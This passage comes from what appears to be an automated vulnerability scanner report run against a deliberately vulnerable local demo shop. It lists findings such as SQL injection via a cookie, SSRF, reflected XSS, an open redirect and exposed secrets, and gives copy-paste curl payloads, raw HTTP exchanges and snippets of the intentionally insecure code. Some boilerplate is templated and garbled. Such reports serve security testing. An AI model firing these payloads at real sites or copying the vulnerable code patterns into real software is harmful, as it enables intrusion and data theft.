
**Raw HTTP exchange:**

```http
GET /track HTTP/1.1
Host: 127.0.0.1:8081
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Accept: */*
Cookie: TrackingId=bhtid-demo-session-0001' AND '1'='1


HTTP/1.1 200

date: Wed, 23 Sep 2026 14:20:07 GMT
server: uvicorn
content-length: 121
content-type: text/html; charset=utf-8

<html><body>Welcome back, administrator! <a href='/my-account'>My account</a> <a href='/logout'>Log out</a></body></html>
```

**Manual reproduction steps:**

1. Open http://127.0.0.1:8081/track in a browser or HTTP client.
2. Send the request again with the cookie 'TrackingId' set to the exploit payload.
3. Payload: bhtid-demo-session-0001' AND '1'='1
4. Observe that the extracted database data appears in the response.

#### False-positive analysis

The exploit phase reproduced the vulnerability end-to-end and extracted real data from the target, which is itself the strongest false-positive disproof: random page drift, caching artefacts or WAF noise cannot fabricate extracted database rows, command output or file contents. No separate control experiments were needed.

**Remediation.** Use parameterized queries; confirm manually with sqlmap.

### 10. [HIGH] Risky HTTP methods enabled: PUT, DELETE, TRACE

- **Class:** Security Misconfiguration
- **URL:** http://127.0.0.1:8081/
- **Injection point:** `GET /`
- **Status:** VERIFIED (exploit attempted)
- **CWE:** CWE-650
- **Module:** http-methods

**Description.** The server advertises HTTP methods that expand the attack surface. Each can be abused as noted below; verify whether they are actually functional (the Allow header is sometimes stale) and gated by authentication.

**Impact.** Exploitation by an attacker would compromise the confidentiality, integrity or availability of the application and its data. Review the evidence and remediation guidance, and retest after the fix is deployed.

**Detection evidence.**

```
- PUT: arbitrary file upload (web shell)
- DELETE: arbitrary file deletion
- TRACE: Cross-Site Tracing (XST)
```

#### Proof of exploitation

**Reproduce (copy-paste):**

```bash
curl -sS -i -G 'http://127.0.0.1:8081/'
```

**Raw HTTP exchange:**

```http
GET / HTTP/1.1
Host: 127.0.0.1:8081
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Accept: */*

```

**Manual reproduction steps:**

1. Open http://127.0.0.1:8081/ in a browser or HTTP client.
2. Send the request again with the query parameter set to the exploit payload.
3. Payload: 
4. Observe that the evidence described above appears in the response.

#### False-positive analysis

All 1 false-positive checks passed (evidence-captured): the attack signature appears only for the crafted payload, never for negative controls or the untouched baseline, and it reproduced consistently on repeat requests. the this finding behaviour is deterministic and input-dependent, which random page noise, rotating content or WAF banners are not.

| Control experiment | Result | Observed behaviour |
|---|---|---|
| evidence-captured | PASS | the finding carries captured request/response evidence (not just a heuristic label) |

**Verdict: LOW false-positive risk** -- every control experiment behaved as physics demands: the attack signature appears only for the crafted payload and reproduces consistently.

**Remediation.** Disable WebDAV unless required; gate PUT/DELETE/CONNECT behind strong auth; disable TRACE entirely.

### 11. [HIGH] Possible hardcoded secret: Stripe secret key

- **Class:** Cryptographic Issue (secrets / JWT / weak hashing)
- **URL:** http://127.0.0.1:8081/
- **Injection point:** `GET /`
- **Status:** VERIFIED (exploit attempted)
- **CWE:** CWE-798
- **Module:** secrets

**Description.** A credential-like string was found in client-delivered content.

**Impact.** Exploitation by an attacker would compromise the confidentiality, integrity or availability of the application and its data. Review the evidence and remediation guidance, and retest after the fix is deployed.

**Detection evidence.**

```
Stripe secret key match: 'sk_live_0123456789abcdefghijklmn'
```

#### Proof of exploitation

**Reproduce (copy-paste):**

```bash
curl -sS -i -G 'http://127.0.0.1:8081/'
```

**Raw HTTP exchange:**

```http
GET / HTTP/1.1
Host: 127.0.0.1:8081
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Accept: */*

```

**Manual reproduction steps:**

1. Open http://127.0.0.1:8081/ in a browser or HTTP client.
2. Send the request again with the query parameter set to the exploit payload.
3. Payload: 
4. Observe that the evidence described above appears in the response.

#### False-positive analysis

All 1 false-positive checks passed (evidence-captured): the attack signature appears only for the crafted payload, never for negative controls or the untouched baseline, and it reproduced consistently on repeat requests. the this finding behaviour is deterministic and input-dependent, which random page noise, rotating content or WAF banners are not.

| Control experiment | Result | Observed behaviour |
|---|---|---|
| evidence-captured | PASS | the finding carries captured request/response evidence (not just a heuristic label) |

**Verdict: LOW false-positive risk** -- every control experiment behaved as physics demands: the attack signature appears only for the crafted payload and reproduces consistently.

**Remediation.** Rotate the exposed secret and keep secrets server-side, never in client code.

### 12. [HIGH] Possible hardcoded secret: Generic API key assignment

- **Class:** Cryptographic Issue (secrets / JWT / weak hashing)
- **URL:** http://127.0.0.1:8081/
- **Injection point:** `GET /`
- **Status:** VERIFIED (exploit attempted)
- **CWE:** CWE-798
- **Module:** secrets

**Description.** A credential-like string was found in client-delivered content.

**Impact.** Exploitation by an attacker would compromise the confidentiality, integrity or availability of the application and its data. Review the evidence and remediation guidance, and retest after the fix is deployed.

**Detection evidence.**

```
Generic API key assignment match: 'api_key = "[REDACTED:aws_access_key]"'
```

#### Proof of exploitation

**Reproduce (copy-paste):**

```bash
curl -sS -i -G 'http://127.0.0.1:8081/'
```

**Raw HTTP exchange:**

```http
GET / HTTP/1.1
Host: 127.0.0.1:8081
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Accept: */*

```

**Manual reproduction steps:**

1. Open http://127.0.0.1:8081/ in a browser or HTTP client.
2. Send the request again with the query parameter set to the exploit payload.
3. Payload: 
4. Observe that the evidence described above appears in the response.

#### False-positive analysis

All 1 false-positive checks passed (evidence-captured): the attack signature appears only for the crafted payload, never for negative controls or the untouched baseline, and it reproduced consistently on repeat requests. the this finding behaviour is deterministic and input-dependent, which random page noise, rotating content or WAF banners are not.

| Control experiment | Result | Observed behaviour |
|---|---|---|
| evidence-captured | PASS | the finding carries captured request/response evidence (not just a heuristic label) |

**Verdict: LOW false-positive risk** -- every control experiment behaved as physics demands: the attack signature appears only for the crafted payload and reproduces consistently.

**Remediation.** Rotate the exposed secret and keep secrets server-side, never in client code.

### 13. [HIGH] Possible SSRF via 'url'

- **Class:** Server-Side Request Forgery (SSRF)
- **URL:** http://127.0.0.1:8081/fetch
- **Injection point:** `GET /fetch -> request parameter 'url'`
- **Status:** VERIFIED ✅ EXPLOITED
- **CWE:** CWE-918
- **Module:** ssrf

**Description.** 'url' appears to trigger a server-side fetch: supplying an internal URL produced a connection-level error surfaced from the server.

#### Vulnerable code location

**Source-mapped sink:** `examples/vulnerable_app.py` (lines 285-294), inside **fetch**. The line marked with `->` is where the injectable input reaches the dangerous sink.

```py
      280 |     stream = os.popen(f"ping -c 1 {host}")
      281 |     return stream.read()
      282 | 
      283 | 
      284 | @app.get("/fetch", response_class=PlainTextResponse)
  ->  285 | def fetch(url: str = "") -> str:
      286 |     # REAL SSRF: the server fetches the requested URL and returns the body.
      287 |     # Loopback fetches (127.0.0.1:<own port>) prove internal access.
      288 |     try:
      289 |         with urllib.request.urlopen(url, timeout=5) as resp:
      290 |             return resp.read().decode("utf-8", "replace")
```

**Impact.** The application fetches attacker-chosen URLs server-side and returns the body. An attacker can pivot into the internal network: read internal-only APIs and admin panels, interact with databases behind the firewall, and -- on cloud hosts -- retrieve instance credentials from metadata services. This is the classic path from web RCE-adjacent bug to full network compromise.

**Detection evidence.**

```
Set url=http://127.0.0.1:1/; response contained a server-side connection error.

GET http://127.0.0.1:8081/fetch (url=http://127.0.0.1:1/)
```

#### Proof of exploitation

The scanner made the target fetch an internal loopback URL (http://127.0.0.1:8081/) and return the response body to us -- the page fingerprint 'Demo Shop' came back from inside the server. SSRF is demonstrated with actual content exfiltration, not just an inferred connection error.

**Data extracted from the target by the exploit:**

```
Internal URL fetched server-side: http://127.0.0.1:8081/
Fingerprint of internal response found in our HTTP response: 'Demo Shop'
Same primitive reaches any internal service reachable from the server (databases, admin panels, metadata services).
```

**Reproduce (copy-paste):**

```bash
curl -sS -i -G --data-urlencode 'url=http://127.0.0.1:8081/' 'http://127.0.0.1:8081/fetch'
```

**Raw HTTP exchange:**

```http
GET /fetch?url=http%3A%2F%2F127.0.0.1%3A8081%2F HTTP/1.1
Host: 127.0.0.1:8081
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Accept: */*


HTTP/1.1 200

date: Wed, 23 Sep 2026 14:20:06 GMT
server: uvicorn
content-length: 1185
content-type: text/plain; charset=utf-8

<html><head><title>Demo Shop</title></head><body>
    <h1>Demo</h1>
    <!-- config -->
    <script>const api_key = "[REDACTED:aws_access_key]"; var stripe="sk_live_0123456789abcdefghijklmn";</script>
    <script src="/static/app.js"></script>
    <a href="/search?q=hello">search</a>
    <a href="/item?id=1">item 1</a>
    <a href="/product?id=1">product 1</a>
    <a href="/filter?category=Accessories">accessories</a>
    <a href="/track">track</a>
    <a href="/stock?sku=Widget">stock</a>
    <a href="/go?url=/home">home</a>
    <a href="/file?name=readme.txt">readme</a>
    <a href="/ping?host=127.0.0.1">ping</a>
    <a href="/fetch?url=/status">fetch</a>
    <a href="/admin">admin</a>
    <a href="mailto:admin@example.com">contact</a>
    <form method="post" action="/transfer">
      <input name="amount" value="10"/><input name="to" value="bob"/>
      <button>send</button>
    </form>
    <form method="post" action="/login">
      <input name="username"/><input type="password" name="password"/>
    </form>
    <form method="post" action="/login-nosql">
      <input name="user"/><input name="pass"/>
      <button>nosql login</button>
    </form>
    </body></html>
```

**Manual reproduction steps:**

1. Open http://127.0.0.1:8081/fetch in a browser or HTTP client.
2. Send the request again with the query parameter set to the exploit payload.
3. Payload: http://127.0.0.1:8081/
4. Observe that the target's own landing-page content (fingerprint 'Demo Shop') is returned from a loopback address the client cannot reach directly.

#### False-positive analysis

The exploit phase reproduced the vulnerability end-to-end and extracted real data from the target, which is itself the strongest false-positive disproof: random page drift, caching artefacts or WAF noise cannot fabricate extracted database rows, command output or file contents. No separate control experiments were needed.

**Remediation.** Enforce an egress allowlist, block internal ranges/metadata IPs, resolve+validate hosts.

### 14. [HIGH] Reflected XSS in 'q'

- **Class:** Cross-Site Scripting (XSS)
- **URL:** http://127.0.0.1:8081/search
- **Injection point:** `GET /search -> request parameter 'q'`
- **Status:** VERIFIED ✅ EXPLOITED
- **CWE:** CWE-79
- **Module:** xss

**Description.** Input from 'q' is reflected without HTML-encoding, allowing script injection.

#### Vulnerable code location

**Source-mapped sink:** `examples/vulnerable_app.py` (lines 164-168), inside **search**. The line marked with `->` is where the injectable input reaches the dangerous sink.

```py
      159 | def security_txt() -> str:
      160 |     return "Contact: mailto:security@example.com\nExpires: 2026-12-31T23:59:59Z\n"
      161 | 
      162 | 
      163 | @app.get("/search", response_class=HTMLResponse)
  ->  164 | def search(q: str = "") -> str:
      165 |     # Reflected XSS: q echoed unencoded.
      166 |     return f"<html><body>Results for: {q}</body></html>"
      167 | 
      168 | 
      169 | @app.get("/item", response_class=HTMLResponse)
```

**Impact.** Attackers execute arbitrary JavaScript in your users' browsers under your origin: session-cookie theft (no HttpOnly required for DOM attacks), keylogging, phishing overlays, silent request forgery with the victim's credentials, and wormable payloads in social features. Every user who opens an attacker-crafted link is affected.

**Detection evidence.**

```
Payload '<bhXSS9271>"\'' reflected as raw HTML (<bhXSS9271> present).

GET http://127.0.0.1:8081/search (q=<bhXSS9271>"')

--- response excerpt ---
<html><body>Results for: <bhXSS9271>"'</body></html>
```

#### Proof of exploitation

The scanner confirmed that executable JavaScript payloads (<script>alert('bhxssrc1')</script>, <img src=x onerror=alert('bhxssrc1')>, <svg onload=alert('bhxssrc1')>, <body onload=alert('bhxssrc1')>) are reflected into the response with no encoding or filtering -- a browser will execute them in the victim's session. This upgrades the finding from 'reflected markup' to a working cross-site scripting exploit.

**Data extracted from the target by the exploit:**

```
Executable payload shapes that survive filtering: 4 of 4
Surviving: <script>alert('bhxssrc1')</script>
Surviving: <img src=x onerror=alert('bhxssrc1')>
Surviving: <svg onload=alert('bhxssrc1')>
Surviving: <body onload=alert('bhxssrc1')>
```

**Reproduce (copy-paste):**

```bash
curl -sS -i -G --data-urlencode 'q=<script>alert('\''bhxssrc1'\'')</script>' 'http://127.0.0.1:8081/search'
```

**Raw HTTP exchange:**

```http
GET /search?q=%3Cscript%3Ealert%28%27bhxssrc1%27%29%3C%2Fscript%3E HTTP/1.1
Host: 127.0.0.1:8081
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Accept: */*


HTTP/1.1 200

date: Wed, 23 Sep 2026 14:20:06 GMT
server: uvicorn
content-length: 73
content-type: text/html; charset=utf-8

<html><body>Results for: <script>alert('bhxssrc1')</script></body></html>
```

**Manual reproduction steps:**

1. Open http://127.0.0.1:8081/search in a browser.
2. Set the query parameter 'q' to: <script>alert('bhxssrc1')</script>
3. Load the resulting URL (send it to a victim in a real attack).
4. Observe the JavaScript alert('bhxssrc1') dialog executing in the page origin.

#### False-positive analysis

The exploit phase reproduced the vulnerability end-to-end and extracted real data from the target, which is itself the strongest false-positive disproof: random page drift, caching artefacts or WAF noise cannot fabricate extracted database rows, command output or file contents. No separate control experiments were needed.

**Remediation.** Context-aware output encoding; apply CSP; validate input.

### 15. [HIGH] Reflected XSS in 'name'

- **Class:** Cross-Site Scripting (XSS)
- **URL:** http://127.0.0.1:8081/file
- **Injection point:** `GET /file -> request parameter 'name'`
- **Status:** VERIFIED ✅ EXPLOITED
- **CWE:** CWE-79
- **Module:** xss

**Description.** Input from 'name' is reflected without HTML-encoding, allowing script injection.

#### Vulnerable code location

**Source-mapped sink:** `examples/vulnerable_app.py` (lines 264-275), inside **file**. The line marked with `->` is where the injectable input reaches the dangerous sink.

```py
      259 |     finally:
      260 |         conn.close()
      261 | 
      262 | 
      263 | @app.get("/file", response_class=HTMLResponse)
  ->  264 | def file(name: str = "readme.txt") -> HTMLResponse:
      265 |     # Path traversal simulation: arbitrary read of "system files".
      266 |     if "etc/passwd" in name or "../" in name:
      267 |         return HTMLResponse(
      268 |             "root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin\n"
      269 |             "www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin"
```

**Impact.** Attackers execute arbitrary JavaScript in your users' browsers under your origin: session-cookie theft (no HttpOnly required for DOM attacks), keylogging, phishing overlays, silent request forgery with the victim's credentials, and wormable payloads in social features. Every user who opens an attacker-crafted link is affected.

**Detection evidence.**

```
Payload '<bhXSS9271>"\'' reflected as raw HTML (<bhXSS9271> present).

GET http://127.0.0.1:8081/file (name=<bhXSS9271>"')

--- response excerpt ---
contents of <bhXSS9271>"'
```

#### Proof of exploitation

The scanner confirmed that executable JavaScript payloads (<script>alert('bhxssrc1')</script>, <img src=x onerror=alert('bhxssrc1')>, <svg onload=alert('bhxssrc1')>, <body onload=alert('bhxssrc1')>) are reflected into the response with no encoding or filtering -- a browser will execute them in the victim's session. This upgrades the finding from 'reflected markup' to a working cross-site scripting exploit.

**Data extracted from the target by the exploit:**

```
Executable payload shapes that survive filtering: 4 of 4
Surviving: <script>alert('bhxssrc1')</script>
Surviving: <img src=x onerror=alert('bhxssrc1')>
Surviving: <svg onload=alert('bhxssrc1')>
Surviving: <body onload=alert('bhxssrc1')>
```

**Reproduce (copy-paste):**

```bash
curl -sS -i -G --data-urlencode 'name=<script>alert('\''bhxssrc1'\'')</script>' 'http://127.0.0.1:8081/file'
```

**Raw HTTP exchange:**

```http
GET /file?name=%3Cscript%3Ealert%28%27bhxssrc1%27%29%3C%2Fscript%3E HTTP/1.1
Host: 127.0.0.1:8081
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Accept: */*


HTTP/1.1 200

date: Wed, 23 Sep 2026 14:20:06 GMT
server: uvicorn
content-length: 46
content-type: text/html; charset=utf-8

contents of <script>alert('bhxssrc1')</script>
```

**Manual reproduction steps:**

1. Open http://127.0.0.1:8081/file in a browser.
2. Set the query parameter 'name' to: <script>alert('bhxssrc1')</script>
3. Load the resulting URL (send it to a victim in a real attack).
4. Observe the JavaScript alert('bhxssrc1') dialog executing in the page origin.

#### False-positive analysis

The exploit phase reproduced the vulnerability end-to-end and extracted real data from the target, which is itself the strongest false-positive disproof: random page drift, caching artefacts or WAF noise cannot fabricate extracted database rows, command output or file contents. No separate control experiments were needed.

**Remediation.** Context-aware output encoding; apply CSP; validate input.

### 16. [HIGH] Reflected XSS in 'url'

- **Class:** Cross-Site Scripting (XSS)
- **URL:** http://127.0.0.1:8081/fetch
- **Injection point:** `GET /fetch -> request parameter 'url'`
- **Status:** confidence: tentative (exploit attempted)
- **CWE:** CWE-79
- **Module:** xss

**Description.** Input from 'url' is reflected without HTML-encoding, allowing script injection.

#### Vulnerable code location

**Source-mapped sink:** `examples/vulnerable_app.py` (lines 285-294), inside **fetch**. The line marked with `->` is where the injectable input reaches the dangerous sink.

```py
      280 |     stream = os.popen(f"ping -c 1 {host}")
      281 |     return stream.read()
      282 | 
      283 | 
      284 | @app.get("/fetch", response_class=PlainTextResponse)
  ->  285 | def fetch(url: str = "") -> str:
      286 |     # REAL SSRF: the server fetches the requested URL and returns the body.
      287 |     # Loopback fetches (127.0.0.1:<own port>) prove internal access.
      288 |     try:
      289 |         with urllib.request.urlopen(url, timeout=5) as resp:
      290 |             return resp.read().decode("utf-8", "replace")
```

**Detection evidence.**

```
Payload '<bhXSS9271>"\'' reflected as raw HTML (<bhXSS9271> present).

GET http://127.0.0.1:8081/fetch (url=<bhXSS9271>"')

--- response excerpt ---
fetch failed: unknown url type: '<bhXSS9271>"\''
```

#### Exploit phase result

Input is reflected unencoded, but the reflection lands in a non-HTML response (Content-Type: text/plain; charset=utf-8), which browsers do not render as markup; not exploitable as stored XSS from this response alone.

#### False-positive analysis

1 of 3 false-positive checks FAILED (fresh-canary-execution-context). Treat this finding as unconfirmed until a human reviews the captured evidence; it may be an artefact of page drift, caching or error pages.

| Control experiment | Result | Observed behaviour |
|---|---|---|
| fresh-canary-execution-context | FAIL | unique canary xssuqdnq3hcw4 reflected with executable handler markup in a non-HTML response |
| not-inside-html-comment | PASS | reflection is outside HTML comments (browsers do not execute payloads inside comments) |
| negative-control | PASS | bare canary reflected as inert text (confirmed), confirming the server renders raw input only when markup is supplied |

**Verdict: MEDIUM false-positive risk** -- at least one control experiment contradicts the finding. Manual review required before triage.

**Remediation.** Context-aware output encoding; apply CSP; validate input.

### 17. [MEDIUM] Exposed management path: admin panel (200)

- **Class:** Information Disclosure / Source Exposure
- **URL:** http://127.0.0.1:8081/admin
- **Injection point:** `GET /admin`
- **Status:** VERIFIED (exploit attempted)
- **CWE:** CWE-538
- **Module:** admin-panels

**Description.** A common management / admin path (/admin) returned HTTP 200, indicating it exists. Investigate authentication, default credentials, and known CVEs for the corresponding product.

#### Vulnerable code location

**Source-mapped sink:** `examples/vulnerable_app.py` (lines 153-157), inside **admin**. The line marked with `->` is where the injectable input reaches the dangerous sink.

```py
      148 |         "mappings": "AAAA",
      149 |     })
      150 | 
      151 | 
      152 | @app.get("/admin", response_class=HTMLResponse)
  ->  153 | def admin() -> HTMLResponse:
      154 |     # Recon breadcrumb: an exposed admin panel.
      155 |     return "<html><body><h1>Admin Panel</h1><form><input name='password'/></form></body></html>"
      156 | 
      157 | 
      158 | @app.get("/.well-known/security.txt", response_class=PlainTextResponse)
```

**Impact.** Exploitation by an attacker would compromise the confidentiality, integrity or availability of the application and its data. Review the evidence and remediation guidance, and retest after the fix is deployed.

**Detection evidence.**

```
GET http://127.0.0.1:8081/admin -> 200; body[:120]="<html><body><h1>Admin Panel</h1><form><input name='password'/></form></body></html>"
```

#### Proof of exploitation

**Reproduce (copy-paste):**

```bash
curl -sS -i -G --data-urlencode 'password=test' 'http://127.0.0.1:8081/admin'
```

**Raw HTTP exchange:**

```http
GET /admin?password=test HTTP/1.1
Host: 127.0.0.1:8081
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Accept: */*

```

**Manual reproduction steps:**

1. Open http://127.0.0.1:8081/admin in a browser or HTTP client.
2. Send the request again with the query parameter set to the exploit payload.
3. Payload: 
4. Observe that the evidence described above appears in the response.

#### False-positive analysis

All 1 false-positive checks passed (evidence-captured): the attack signature appears only for the crafted payload, never for negative controls or the untouched baseline, and it reproduced consistently on repeat requests. the this finding behaviour is deterministic and input-dependent, which random page noise, rotating content or WAF banners are not.

| Control experiment | Result | Observed behaviour |
|---|---|---|
| evidence-captured | PASS | the finding carries captured request/response evidence (not just a heuristic label) |

**Verdict: LOW false-positive risk** -- every control experiment behaved as physics demands: the attack signature appears only for the crafted payload and reproduces consistently.

**Remediation.** Remove the management interface from public exposure; gate behind VPN / strong auth.

### 18. [MEDIUM] Exposed management path: ReDoc (200)

- **Class:** Information Disclosure / Source Exposure
- **URL:** http://127.0.0.1:8081/redoc
- **Injection point:** `GET /redoc`
- **Status:** VERIFIED (exploit attempted)
- **CWE:** CWE-538
- **Module:** admin-panels

**Description.** A common management / admin path (/redoc) returned HTTP 200, indicating it exists. Investigate authentication, default credentials, and known CVEs for the corresponding product.

**Impact.** Exploitation by an attacker would compromise the confidentiality, integrity or availability of the application and its data. Review the evidence and remediation guidance, and retest after the fix is deployed.

**Detection evidence.**

```
GET http://127.0.0.1:8081/redoc -> 200; body[:120]='\n    <!DOCTYPE html>\n    <html>\n    <head>\n    <title>FastAPI - ReDoc</title>\n    <!-- needed for adaptive design -->\n  '
```

#### False-positive analysis

All 1 false-positive checks passed (evidence-captured): the attack signature appears only for the crafted payload, never for negative controls or the untouched baseline, and it reproduced consistently on repeat requests. the this finding behaviour is deterministic and input-dependent, which random page noise, rotating content or WAF banners are not.

| Control experiment | Result | Observed behaviour |
|---|---|---|
| evidence-captured | PASS | the finding carries captured request/response evidence (not just a heuristic label) |

**Verdict: LOW false-positive risk** -- every control experiment behaved as physics demands: the attack signature appears only for the crafted payload and reproduces consistently.

**Remediation.** Remove the management interface from public exposure; gate behind VPN / strong auth.

### 19. [MEDIUM] Exposed management path: status (200)

- **Class:** Information Disclosure / Source Exposure
- **URL:** http://127.0.0.1:8081/status
- **Injection point:** `GET /status`
- **Status:** VERIFIED (exploit attempted)
- **CWE:** CWE-538
- **Module:** admin-panels

**Description.** A common management / admin path (/status) returned HTTP 200, indicating it exists. Investigate authentication, default credentials, and known CVEs for the corresponding product.

#### Vulnerable code location

**Source-mapped sink:** `examples/vulnerable_app.py` (lines 315-318), inside **status**. The line marked with `->` is where the injectable input reaches the dangerous sink.

```py
      310 |         )
      311 |     return HTMLResponse("<html><body>Invalid credentials</body></html>")
      312 | 
      313 | 
      314 | @app.get("/status", response_class=PlainTextResponse)
  ->  315 | def status() -> str:
      316 |     return "status ok"
      317 | 
      318 | 
      319 | @app.options("/")
      320 | def options_root() -> Response:
```

**Impact.** Exploitation by an attacker would compromise the confidentiality, integrity or availability of the application and its data. Review the evidence and remediation guidance, and retest after the fix is deployed.

**Detection evidence.**

```
GET http://127.0.0.1:8081/status -> 200; body[:120]='status ok'
```

#### False-positive analysis

All 1 false-positive checks passed (evidence-captured): the attack signature appears only for the crafted payload, never for negative controls or the untouched baseline, and it reproduced consistently on repeat requests. the this finding behaviour is deterministic and input-dependent, which random page noise, rotating content or WAF banners are not.

| Control experiment | Result | Observed behaviour |
|---|---|---|
| evidence-captured | PASS | the finding carries captured request/response evidence (not just a heuristic label) |

**Verdict: LOW false-positive risk** -- every control experiment behaved as physics demands: the attack signature appears only for the crafted payload and reproduces consistently.

**Remediation.** Remove the management interface from public exposure; gate behind VPN / strong auth.

### 20. [MEDIUM] Exposed API documentation: OpenAPI JSON

- **Class:** Information Disclosure / Source Exposure
- **URL:** http://127.0.0.1:8081/openapi.json
- **Injection point:** `GET /openapi.json`
- **Status:** VERIFIED (exploit attempted)
- **CWE:** CWE-200
- **Module:** api-discovery

**Description.** An API description endpoint is publicly accessible. It exposes the entire API surface (endpoints, parameters, schemas, and often internal/undocumented routes) -- a treasure map for the active phase.

**Impact.** Exploitation by an attacker would compromise the confidentiality, integrity or availability of the application and its data. Review the evidence and remediation guidance, and retest after the fix is deployed.

**Detection evidence.**

```
GET http://127.0.0.1:8081/openapi.json -> 200; content-type=application/json; body[:200]='{"openapi":"3.1.0","info":{"title":"FastAPI","version":"0.1.0"},"paths":{"/":{"get":{"summary":"Index","operationId":"index__get","responses":{"200":{"description":"Successful Response","content":{"te'
```

#### False-positive analysis

All 1 false-positive checks passed (evidence-captured): the attack signature appears only for the crafted payload, never for negative controls or the untouched baseline, and it reproduced consistently on repeat requests. the this finding behaviour is deterministic and input-dependent, which random page noise, rotating content or WAF banners are not.

| Control experiment | Result | Observed behaviour |
|---|---|---|
| evidence-captured | PASS | the finding carries captured request/response evidence (not just a heuristic label) |

**Verdict: LOW false-positive risk** -- every control experiment behaved as physics demands: the attack signature appears only for the crafted payload and reproduces consistently.

**Remediation.** Restrict API doc endpoints to authenticated / internal users.

### 21. [MEDIUM] Exposed API documentation: ReDoc

- **Class:** Information Disclosure / Source Exposure
- **URL:** http://127.0.0.1:8081/redoc
- **Injection point:** `GET /redoc`
- **Status:** VERIFIED (exploit attempted)
- **CWE:** CWE-200
- **Module:** api-discovery

**Description.** An API description endpoint is publicly accessible. It exposes the entire API surface (endpoints, parameters, schemas, and often internal/undocumented routes) -- a treasure map for the active phase.

**Impact.** Exploitation by an attacker would compromise the confidentiality, integrity or availability of the application and its data. Review the evidence and remediation guidance, and retest after the fix is deployed.

**Detection evidence.**

```
GET http://127.0.0.1:8081/redoc -> 200; content-type=text/html; charset=utf-8; body[:200]='\n    <!DOCTYPE html>\n    <html>\n    <head>\n    <title>FastAPI - ReDoc</title>\n    <!-- needed for adaptive design -->\n    <meta charset="utf-8"/>\n    <meta name="viewport" content="width=device-width,'
```

#### False-positive analysis

All 1 false-positive checks passed (evidence-captured): the attack signature appears only for the crafted payload, never for negative controls or the untouched baseline, and it reproduced consistently on repeat requests. the this finding behaviour is deterministic and input-dependent, which random page noise, rotating content or WAF banners are not.

| Control experiment | Result | Observed behaviour |
|---|---|---|
| evidence-captured | PASS | the finding carries captured request/response evidence (not just a heuristic label) |

**Verdict: LOW false-positive risk** -- every control experiment behaved as physics demands: the attack signature appears only for the crafted payload and reproduces consistently.

**Remediation.** Restrict API doc endpoints to authenticated / internal users.

### 22. [MEDIUM] Cookie 'SESSIONID' missing security flags

- **Class:** Session Fixation / Hijacking
- **URL:** http://127.0.0.1:8081/
- **Injection point:** `GET /`
- **Status:** VERIFIED (exploit attempted)
- **CWE:** CWE-614
- **Module:** cookies

**Description.** Cookie 'SESSIONID' is set without: missing Secure, missing HttpOnly, missing SameSite. This weakens protection against theft (XSS) and CSRF.

**Impact.** Exploitation by an attacker would compromise the confidentiality, integrity or availability of the application and its data. Review the evidence and remediation guidance, and retest after the fix is deployed.

**Detection evidence.**

```
Set-Cookie: SESSIONID=...; missing Secure; missing HttpOnly; missing SameSite
```

#### Proof of exploitation

**Reproduce (copy-paste):**

```bash
curl -sS -i -G 'http://127.0.0.1:8081/'
```

**Raw HTTP exchange:**

```http
GET / HTTP/1.1
Host: 127.0.0.1:8081
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Accept: */*

```

**Manual reproduction steps:**

1. Open http://127.0.0.1:8081/ in a browser or HTTP client.
2. Send the request again with the query parameter set to the exploit payload.
3. Payload: 
4. Observe that the evidence described above appears in the response.

#### False-positive analysis

All 1 false-positive checks passed (evidence-captured): the attack signature appears only for the crafted payload, never for negative controls or the untouched baseline, and it reproduced consistently on repeat requests. the this finding behaviour is deterministic and input-dependent, which random page noise, rotating content or WAF banners are not.

| Control experiment | Result | Observed behaviour |
|---|---|---|
| evidence-captured | PASS | the finding carries captured request/response evidence (not just a heuristic label) |

**Verdict: LOW false-positive risk** -- every control experiment behaved as physics demands: the attack signature appears only for the crafted payload and reproduces consistently.

**Remediation.** Set Secure, HttpOnly and SameSite=Lax/Strict on session cookies.

### 23. [MEDIUM] Open redirect via 'url'

- **Class:** Open Redirect
- **URL:** http://127.0.0.1:8081/go
- **Injection point:** `GET /go -> request parameter 'url'`
- **Status:** VERIFIED ✅ EXPLOITED
- **CWE:** CWE-601
- **Module:** open-redirect

**Description.** 'url' redirects to an attacker-controlled external URL.

#### Vulnerable code location

**Source-mapped sink:** `examples/vulnerable_app.py` (lines 296-300), inside **go**. The line marked with `->` is where the injectable input reaches the dangerous sink.

```py
      291 |     except Exception as exc:  # noqa: BLE001 -- deliberate demo behaviour
      292 |         return f"fetch failed: {exc}"
      293 | 
      294 | 
      295 | @app.get("/go")
  ->  296 | def go(url: str = "/") -> RedirectResponse:
      297 |     # Open redirect.
      298 |     return RedirectResponse(url)
      299 | 
      300 | 
      301 | @app.post("/login-nosql", response_class=HTMLResponse)
```

**Impact.** Your domain is weaponised for phishing: links, emails and QR codes that point to your trusted origin silently land users on attacker infrastructure. In OAuth/OIDC flows an open redirect_uri leaks authorization codes and tokens directly to attackers.

**Detection evidence.**

```
Set url=https://bughound-evil.example/ -> Location/final: https://bughound-evil.example/

GET http://127.0.0.1:8081/go (url=https://bughound-evil.example/)
```

#### Proof of exploitation

The scanner verified the end-to-end redirect flow: a victim clicking the crafted link is sent from your trusted origin to https://bughound-evil.example/ (requests followed for documentation only).

**Data extracted from the target by the exploit:**

```
1.  HTTP 307 -> Location: https://bughound-evil.example/
```

